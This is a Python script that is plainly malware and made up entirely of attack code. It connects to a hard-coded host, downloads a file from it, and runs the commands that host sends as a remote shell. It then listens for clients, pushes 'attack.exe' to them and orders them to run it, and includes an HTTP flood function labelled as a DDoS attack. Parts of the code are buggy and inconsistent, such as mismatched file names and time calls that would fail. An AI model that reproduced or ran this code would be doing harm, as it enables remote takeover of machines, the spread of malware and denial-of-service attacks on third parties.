import socket
import os
import subprocess
from time import *
import threading
import random
import sys

#from python.cn.client import HOST

s = socket.socket()
host = '172.37.32.3'
port = 9999
ser = 0

s.connect((host, port))

def http_flood(target_ip, target_port, duration):
    headers = "GET / HTTP/1.1\r\nHost: " + target_ip + "\r\n\r\n"
    duration = time.time() + duration
    packets_sent = 0
    try:
        while True:
            if time.time() > duration:
                break
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target_ip, target_port))
                sock.sendall(headers.encode())
                sock.close()
                packets_sent += 1
                print(
                    f"Sent HTTP packet to {target_ip}:{target_port} [Total packets sent: {packets_sent}]"
                )
    except KeyboardInterrupt:
        print("Attack stopped by user (CTRL + C)")

while True:
    file_name = s.recv(1024).decode()
    print(file_name)
    file_size = s.recv(1024).decode()
    print(file_size)

    file = open(file_name,"wb")
    file_byetes= b""

    donee = False

    while not donee:
        data = s.recv(1024)
        if file_byetes[-5:] == b"<END>":
            donee = True
        else:
            file_byetes += data   

    file.write(file_byetes)       

    file.close()

    sleep(5)
    
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        currentWD = os.getcwd() + "> "
        s.send(str.encode(output_str + currentWD))

        print(output_str)

        host = output_str

        ser = 1

        if(ser):
            # Create a Socket ( connect two computers)
         def create_socket():
            try:
                global host
                global port
                global s
                host = ""
                port = 9999
                s = socket.socket()

            except socket.error as msg:
                print("Socket creation error: " + str(msg))


        # Binding the socket and listening for connections
        def bind_socket():
            try:
                global host
                global port
                global s
                print("Binding the Port: " + str(port))

                s.bind((host, port))
                s.listen(5)

            except socket.error as msg:
                print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
                bind_socket()


        # Establish connection with a client (socket must be listening)

        def socket_accept():
            global address
            conn, address = s.accept()
            print("Connection has been established! |" + " IP " + address[0] + " | Port" + str(address[1]))
            file = open("attack.exe","rb")
            file_size = os.path.getsize("class.exe")

            conn.send("recived_exe.exe".encode())
            conn.send(str(file_size).encode())

            data = file.read()
            print(data)
            conn.sendall(data)
            conn.send(b"<END>")
            conn.close()
            file.close()
            sleep(5)
            send_commands(conn)
            

        # Send commands to client/victim or a friend
        def send_commands(conn):
            while True:
                cmd = "start attack.exe"
                if cmd == 'quit':
                    conn.close()
                    s.close()
                    sys.exit()
                if len(str.encode(cmd)) > 0:
                    conn.send(str.encode(cmd))
                    client_response = str(conn.recv(2048),"utf-8")
                    print(client_response, end="")
                    cmd = address



        def main():
            create_socket()
            bind_socket()
            socket_accept()


        main()

        sleep(5)

        #ddos attack now
        http_flood("172.37.32.3", 9999, 5)
